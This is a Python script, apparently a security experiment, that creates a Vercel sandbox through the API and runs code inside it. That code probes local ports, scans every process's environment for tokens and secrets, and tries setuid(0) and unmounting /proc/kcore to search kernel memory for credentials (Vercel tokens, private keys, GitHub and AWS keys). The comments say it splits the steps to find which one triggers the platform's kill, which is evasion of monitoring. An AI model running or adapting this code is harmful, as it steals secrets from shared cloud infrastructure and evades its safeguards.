# 实验J176v2: 拆步定位触发点 + direct map 扫描
# j176v1: PA(端口+environ)/PB(扫描) 全被杀(无输出无traceback=SIGKILL)
# v2: 拆成 PA1(socket)/PA2(proc枚举)/PB(扫描) 每步写checkpoint定位触发点
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def catfile(sid, path, label, n=8000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "cat", "args": [path], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj176"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
if c != 200:
    print(r[:400])
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

# PA1: 仅 socket 探测, 每步写checkpoint
PA1 = r'''
import os, socket
out = open("/tmp/d176a1.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def probe(port, payload=None, to=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(to)
        s.connect(("127.0.0.1", port))
        if payload:
            s.send(payload)
        try:
            d = s.recv(2048)
        except Exception:
            d = b""
        s.close()
        return d
    except Exception as ex:
        return ("EXC:" + repr(ex)).encode()
p("start")
for port in [30001, 30002, 23456]:
    r1 = probe(port)
    p("PORT", port, "banner", r1[:300])
    r2 = probe(port, b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n")
    p("PORT", port, "http", r2[:400])
p("done")
out.close()
'''

# PA2: 进程枚举 (每 pid 写checkpoint)
PA2 = r'''
import os
out = open("/tmp/d176a2.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("start")
pids = sorted(int(x) for x in os.listdir("/proc") if x.isdigit())
p("nproc", len(pids))
for pid in pids:
    try:
        with open(f"/proc/{pid}/cmdline", "rb") as fh:
            cl = fh.read().replace(b"\x00", b" ").decode(errors="replace")[:120]
        with open(f"/proc/{pid}/status") as fh:
            st = {}
            for ln in fh.read().splitlines():
                if ":" in ln:
                    k, v = ln.split(":", 1)
                    st[k.strip()] = v.strip()
        p("PROC", pid, st.get("Name"), "uid", st.get("Uid"), "ppid", st.get("PPid"),
          "cmd", cl)
    except Exception as ex:
        p("PROC_ERR", pid, repr(ex))
p("procdone")
# environ 敏感词扫描
KEYS = [b"VERCEL", b"TOKEN", b"KEY", b"SECRET", b"PASS", b"AUTH", b"AWS", b"GITHUB", b"BEARER", b"VCP"]
for pid in pids:
    try:
        with open(f"/proc/{pid}/environ", "rb") as fh:
            env = fh.read()
        if not env:
            continue
        for kv in env.split(b"\x00"):
            if not kv:
                continue
            up = kv.upper()
            if any(k in up for k in KEYS):
                safe = kv.replace(b"\n", b"\\n")[:300]
                p("ENV", pid, safe.decode(errors="replace"))
    except Exception as ex:
        p("ENV_ERR", pid, repr(ex))
p("envdone")
out.close()
'''

# PB: direct map 扫描 (checkpoint 每段)
PB = r'''
import os, ctypes, struct
out = open("/tmp/d176b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
libc = ctypes.CDLL("libc.so.6", use_errno=True)
if os.getuid() != 0:
    libc.setuid(0)
r1 = libc.umount(b"/proc/kcore")
p("umount", r1)
fd = os.open("/proc/kcore", os.O_RDONLY)
p("opened")
def rd_at(off, n):
    pos = os.lseek(fd, off, 0)
    if pos != off:
        return b""
    return os.read(fd, n)

head = rd_at(0, 64)
p("head", len(head))
e_phoff = struct.unpack("<Q", head[32:40])[0]
e_phentsize = struct.unpack("<H", head[54:56])[0]
e_phnum = struct.unpack("<H", head[56:58])[0]
segs = []
for i in range(e_phnum):
    off = e_phoff + i * e_phentsize
    h = rd_at(off, 56)
    p_type = struct.unpack("<I", h[0:4])[0]
    if p_type != 1:
        continue
    p_offset = struct.unpack("<Q", h[8:16])[0]
    p_vaddr = struct.unpack("<Q", h[16:24])[0]
    p_filesz = struct.unpack("<Q", h[32:40])[0]
    segs.append((p_offset, p_vaddr, p_filesz))
p("segs", len(segs))

patterns = [b"vcp_", b"BEGIN PRIVATE KEY", b"BEGIN RSA PRIVATE KEY", b"Authorization: Bearer",
            b"ghp_", b"AKIA", b"sk-live-", b"x-vercel-", b"x-signature",
            b"AWS_SECRET_ACCESS_KEY", b"AIza", b"-----BEGIN OPENSSH PRIVATE KEY"]
stats = {pat: 0 for pat in patterns}
hits_shown = {pat: 0 for pat in patterns}
total = 0
chunk = 8 * 1024 * 1024
for si, (off0, vaddr, fsz) in enumerate(segs):
    if not (0xffff888000000000 <= vaddr < 0xffff889000000000):
        continue
    p("SCANSEG", si, hex(vaddr), hex(fsz))
    pos = 0
    while pos < fsz:
        try:
            d = rd_at(off0 + pos, chunk)
        except Exception as ex:
            p("READ_EXC", hex(vaddr + pos), repr(ex))
            break
        if not d:
            p("READ_EMPTY", hex(vaddr + pos))
            break
        total += len(d)
        for pat in patterns:
            idx = 0
            while True:
                idx = d.find(pat, idx)
                if idx < 0:
                    break
                stats[pat] += 1
                if hits_shown[pat] < 5:
                    ctx = d[max(0, idx - 24):idx + 96]
                    p("HIT", pat.decode(), "vaddr", hex(vaddr + pos + idx),
                      "ctx", ctx.replace(b"\x00", b".").replace(b"\n", b"\\n")[:140].decode(errors="replace"))
                    hits_shown[pat] += 1
                idx += 1
        pos += len(d)
        if pos % (64 * 1024 * 1024) == 0:
            p("PROGRESS", si, hex(vaddr + pos))
p("scanned_bytes", total)
for pat in patterns:
    p("STAT", pat.decode(), stats[pat])
os.close(fd)
p("=== B_DONE")
out.close()
'''

steps = [
    ("p1-socket", "/tmp/d176a1.txt", PA1),
    ("p2-proc", "/tmp/d176a2.txt", PA2),
    ("mem-scan", "/tmp/d176b.txt", PB),
]
for label, marker, code in steps:
    st = run_cmd(sid, code, label, timeout=280)
    time.sleep(2)
    cf = catfile(sid, marker, f"marker[{label}]", 8000)
    if st == "DEAD" or cf == 410:
        print(f"\n!!! DEATH after cmd[{label}] -> trigger = {label}", flush=True)
        break

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
